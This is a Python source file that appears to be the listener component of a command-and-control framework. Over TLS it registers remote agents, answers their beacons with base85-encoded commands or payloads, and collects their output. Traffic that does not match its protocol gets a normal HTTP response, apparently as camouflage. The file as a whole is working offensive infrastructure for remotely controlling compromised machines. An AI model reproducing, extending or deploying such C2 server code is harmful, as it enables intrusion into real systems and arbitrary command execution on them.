import ssl
import json
import time
import uuid
import base64
import logging
import threading
from common.agent import Agent
from common.responses import serve_http
from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET


class Listener:
    def __init__(self, port, host, secret, agents, listeners):
        self.port = port
        self.host = host
        self.secret = secret
        self.agents = agents
        self.listeners = listeners
        self.uuid = uuid.uuid4()
        self._killed = False
        self.logger = logging.getLogger(__name__)
        logging.debug(str(self.uuid) + " Listener spawned")

    def _kill(self):
        logging.debug(str(self.uuid) + " Closing socket")
        socket(AF_INET, SOCK_STREAM).connect((self.host, self.port))
        self.tcp_socket.close()

    def get_response(self, json_stub, connection):
        agent_uuid = json_stub["uuid"]
        response = json_stub["data"]
        # If the agent has already been associated, skip
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid and response:
                agent.update_lastseen()
                print(response)
                connection.send('_response{"status" : "ACK"}'.encode())
                connection.close()
                return
        connection.close()

    def associate_agent(self, json_stub, connection):
        agent_uuid = json_stub["uuid"]
        logging.debug(str(self.uuid) + " Associating agent with UUID: " + agent_uuid)
        # If the agent has already been associated, skip
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                logging.debug(
                    str(self.uuid) + " Agent already seen! Updating lastseen time."
                )
                agent.update_lastseen()
                connection.send('_response{"status" : "ACK"}'.encode())
                connection.close()
                return
        lastseen = time.time()
        enumdata = json_stub["enumdata"]
        tmp_agent = Agent(self, agent_uuid, lastseen, enumdata)
        self.agents[agent_uuid] = tmp_agent
        connection.send('_response{"status" : "ACK"}'.encode())
        connection.close()
        logging.debug(str(self.uuid) + " Agent associated successfully.")

    def beacon_respond(self, json_stub, connection):
        agent_uuid = json_stub["uuid"]
        for uuid, agent in self.agents.items():
            if uuid == agent_uuid:
                agent.update_lastseen()
                # Commands take precedence over payloads
                command = agent.get_command()
                if command:
                    response_packet_stub = {
                        "status": "OK",
                        "command": base64.b85encode(command.encode()).decode(),
                        "payload": None,
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    connection.send(cmd_pkt.encode())
                    connection.close()
                    return

                payload = agent.get_payload()
                if payload:
                    response_packet_stub = {
                        "status": "OK",
                        "command": None,
                        "payload": base64.b85encode(payload.encode()).decode(),
                    }
                    cmd_pkt = "_response" + json.dumps(response_packet_stub)
                    connection.send(cmd_pkt.encode())
                    connection.close()
                    return

                response_packet_stub = {
                    "status": "OK",
                    "command": None,
                    "payload": None,
                }
                cmd_pkt = "_response" + json.dumps(response_packet_stub)
                connection.send(cmd_pkt.encode())
                connection.close()
                return

        connection.close()

    def handle_proto_msg(self, proto_msg, connection):
        logging.debug(str(self.uuid) + " Handling protocol message: " + proto_msg)
        if "_associate" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[10:])
            except:
                serve_http(connection, proto_msg)
            try:
                if json_stub["secret"] == self.secret:
                    self.associate_agent(json_stub, connection)
            except KeyError:
                serve_http(connection, proto_msg)
        elif "_beacon" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[7:])
            except:
                serve_http(connection, proto_msg)
            try:
                if json_stub["secret"] == self.secret:
                    self.beacon_respond(json_stub, connection)
            except KeyError:
                serve_http(connection, proto_msg)
        elif "_response" in proto_msg:
            try:
                json_stub = json.loads(proto_msg[9:])
            except:
                serve_http(connection, proto_msg)
            try:
                if json_stub["secret"] == self.secret:
                    self.get_response(json_stub, connection)
            except KeyError:
                serve_http(connection, proto_msg)
        else:
            serve_http(connection, proto_msg)
        connection.close()

    def main_thread(self):
        logging.debug(str(self.uuid) + " Listener thread started")
        self.tcp_socket = socket(AF_INET, SOCK_STREAM)
        self.tcp_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        try:
            logging.debug(str(self.uuid) + " Listener binding socket")
            self.tcp_socket.bind((self.host, self.port))
            self.listeners.append(self)
        except:
            logging.error(str(self.uuid) + " Listener failed.", exc_info=True)
            return
        self.tcp_socket.listen(1)
        logging.debug(str(self.uuid) + " Listener wrapping socket in TLS")
        self.wrapped_socket = ssl.wrap_socket(
            self.tcp_socket,
            server_side=True,
            certfile="data/cert.pem",
            keyfile="data/cert.pem",
        )

        logging.debug(str(self.uuid) + " Listener listening...")
        while not self._killed:
            try:
                connection, address = self.wrapped_socket.accept()
                data = str(connection.recv(12000).decode())
                threading.Thread(
                    target=self.handle_proto_msg, args=((data, connection))
                ).start()
            except ssl.SSLError as e:
                logging.error(str(self.uuid) + " Listener SSL error.", exc_info=True)
